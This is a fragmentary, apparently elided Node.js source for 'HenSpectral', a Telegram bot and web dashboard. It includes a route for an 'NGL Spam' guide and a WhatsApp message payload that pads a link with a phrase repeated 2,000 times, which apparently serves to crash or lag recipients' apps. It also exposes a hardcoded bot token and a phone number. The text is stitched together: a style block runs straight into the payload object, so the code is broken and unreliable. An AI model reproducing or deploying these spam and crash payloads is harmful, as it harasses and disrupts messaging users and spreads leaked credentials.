...
// ==================== CONFIGURATION ==================== //
const BOT_TOKEN = "8238565284:AAHb3j1qM8SzaDRSlcRE1SBLC_gfA9C--BA";
const OWNER_ID = "6574039434";
...
bot.command('start', async (ctx) => {
    try {
        ...
        await ctx.replyWithPhoto(ambilFoto, {
            caption: `
⫹⫺ <a href="https://t.me/Hendra Roorr">𝐃𝐢𝐜𝐭𝐢𝐯𝐞 ☇ 𝐂𝐨𝐫𝐞°𝐒𝐲𝐬𝐭𝐞𝐦𝐬</a>
⏣ Creator : @Hendra Roorr
⏣ Version : 2.0
⏣ League : Asia⧸Bandung
...
─────────────────────────────────────
NAME APPS   : HenSpectral
AUTHOR      : Hendra Roorr
TELEGRAM    : https://t.me/Hendra Roorr
...
// Route untuk serve logo dari database
app.get("/logo", (req, res) => {
  const logoPath = path.join(__dirname, "database", "logo.jpg");
...
// ==================== DASHBOARD ROUTE (Hendra Roorr-X) ==================== //
...
<head>
  ...
  <title>HenSpectral - Dashboard</title>
...
<body>
  ...
  <div class="sidebar" id="sidebar">
    <div class="sidebar-header">
      ...
      <div class="app-title">HenSpectral</div>
    ...
    <ul class="nav-menu">
      ...
      <li class="nav-item"><a href="https://te.me/Hendra Roorr" class="nav-link"><i class="fab fa-telegram"></i>Telegram</a></li>
      <li class="nav-item"><a href="https://wa.me/6288987383979" class="nav-link"><i class="fab fa-whatsapp"></i>WhatsApp</a></li>
...
app.get("/ngl-spam/guide", requireAuth, (req, res) => {
  ...
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Panduan NGL Spam - HenSpectral</title>
      <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
      <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
      <style>
        :root {
          ...
          buttonsMessage: {
            ...
            contextInfo: {
              ...
              externalAdReply: {
                ...
                sourceUrl: `https://t.me/${"عليكم".repeat(2000)}Hendra Roorr`,
              },
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/Hendra Roorr",
                    unconsentedUsersUrl: "https://t.me/Hendra Roorr",
                    consentedUsersUrl: "https://t.me/Hendra Roorr",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/Hendra Roorr",
  ...
  <div class="main-content">
    ...
    <div class="info-section">
      ...
      <div class="info-content">
        ...
        <p>HenSpectral menggunakan protokol keamanan tingkat tinggi untuk melindungi identitas dan data pengguna:</p>
